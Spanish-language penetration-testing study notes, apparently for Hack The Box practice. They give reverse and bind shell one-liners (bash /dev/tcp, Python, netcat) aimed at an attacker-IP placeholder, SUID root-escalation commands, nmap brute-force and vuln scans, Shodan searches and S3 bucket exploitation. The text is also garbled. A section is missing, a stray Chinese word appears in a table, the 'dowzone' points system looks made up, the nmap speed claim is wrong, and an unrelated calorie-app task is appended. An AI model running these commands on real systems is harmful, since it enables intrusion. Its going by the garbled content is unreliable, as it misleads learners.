## ① Dowzone — Sistema de puntos HTB

### ¿Qué es dowzone?

Puntos que ganás al resolver máquinas en HTB. Se usan para desbloquear badges y niveles.

### ¿Cómo se ganan puntos?

| Acción | Puntos |
|---|---|
| Resolver una máquina | +10/20/40 dependiendo de la dificultad |
| Completar Starting Point | +10 por tier |
| Resolver challenges | +10 por challenge |

> [!important] No es obligatorio
> Dowzone es un sistema de gamificación. No afecta tu aprendizaje ni tu capacidad de resolver máquinas.

## ② Reverse Shells — Métodos diferentes

### Reverse Shell con Bash

```bash
bash -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>&1
```

### Reverse Shell con Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",<PUERTO>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Reverse Shell con Netcat

```bash
nc -e /bin/sh <IP_ATACANTE> <PUERTO>
```

### Bind Shell

```bash
# En la máquina atacada
nc -lvvp <PUERTO> -e /bin/sh
```

> [!important] Diferencia entre Bind y Reverse
> **Bind Shell**: el servidor escucha, vos te conectás. Usado cuando no hay firewall de salida.
> **Reverse Shell**: vos escuchás, el servidor se conecta a vos. Usado cuando el firewall bloquea conexiones entrantes pero permite salientes.

## ③ Nmap — Herramientas de enumeración avanzada

### Scripts de Nmap

```bash
# Enumeración de servicios
nmap -sC -sV -p- --open <IP>

# Scripts de vulnerabilidades
nmap --script=vuln -p- <IP>

# Scripts de autenticación
nmap --script=auth -p- <IP>

# Scripts de brute-force
nmap --script=brute -p- <IP>
```

### Configuración avanzada

```bash
# Aumentar velocidad (T4 es el más rápido)
nmap -T4 -p- --open <IP>

# Escaneo sigiloso (stealth)
nmap -sS -p- --open <IP>

# Escaneo completo con versión
nmap -sC -sV -p- --open <IP>
```

## ⑤ SUID Binaries

### Qué es SUID

**Set User ID**: permiso especial que permite ejecutar un binario con los privilegios del propietario (normalmente root).

### Buscar SUID

```bash
# Buscar todos los binarios SUID
find / -perm -4000 2>/dev/null

# Buscar en un directorio específico
find /usr -perm -4000 2>/dev/null
```

### Binarios SUID comunes y explotación

| Binario | Cómo explotar |
|---|---|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `nmap` | `nmap --interactive`然后 `!sh` |
| `python` | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `bash` | `bash -p` |

> [!important] GTFOBins
> **GTFOBins** es la referencia definitiva para explotar binarios SUID. Siempre consultá ahí primero: https://gtfobins.github.io/

## ⑥ Shodan — Cómo buscar información

### Búsqueda básica

```bash
# Buscar por IP
shodan host <IP>

# Buscar por servicios
shodan search "apache"

# Buscar por país
shodan search "country:US"
```

### Filtros de Shodan

| Filtro | Descripción |
|---|---|
| `port:` | Filtrar por puerto |
| `org:` | Filtrar por organización |
| `hostname:` | Filtrar por hostname |
| `os:` | Filtrar por sistema operativo |
| `product:` | Filtrar por producto |
| `version:` | Filtrar por versión |

### Ejemplos de búsqueda

```bash
# Servicios Apache en España
shodan search "apache country:ES"

# Servicios expuestos en el puerto 80
shodan search "port:80"

# Versiones vulnerables
shodan search "apache/2.4.49"
```

## ⑦ Buckets (S3, Azure Blob, GCP)

### Qué son

**Buckets** son contenedores de almacenamiento en la nube (AWS S3, Azure Blob, GCP Storage).

### Cómo buscarlos

```bash
# Con Nmap
nmap --script=s3-enum -p- <IP>

# Con herramientas específicas
s3scanner scan -f buckets.txt

# Con Shodan
shodan search "org:AmazonAWS s3"
```

### Cómo explotarlos

```bash
# Listar contenido de un bucket
aws s3 ls s3://<nombre-bucket>

# Descargar archivos
aws s3 cp s3://<nombre-bucket>/<archivo> .

# Subir archivos
aws s3 cp <archivo> s3://<nombre-bucket>/
```

> [!important] Permisos
> Si el bucket es público, podés listarlo. Si tiene permisos de escritura, podés subir archivos. Esto es un hallazgo crítico en auditorías.

## ⑧ Bandit (OverTheWire) — Nivel 24

### Resolución del nivel 24

El nivel 24 de Bandit requiere ejecutar un script con un argumento específico:

```bash
# Conectarse
ssh bandit24@bandit.overthewire.org -p 2220

# Buscar el script
ls -la /usr/bin/

# Ejecutar el script con el argumento correcto
./<script> <argumento>
```

> [!important] Consejo
> El argumento está en algún archivo del sistema. Hay que buscarlo con `grep` o `find`.

Crear una aplicación web que:
1. Permita ingresar alimentos
2. Calcule las calorías
3. Almacene los datos en una base de datos
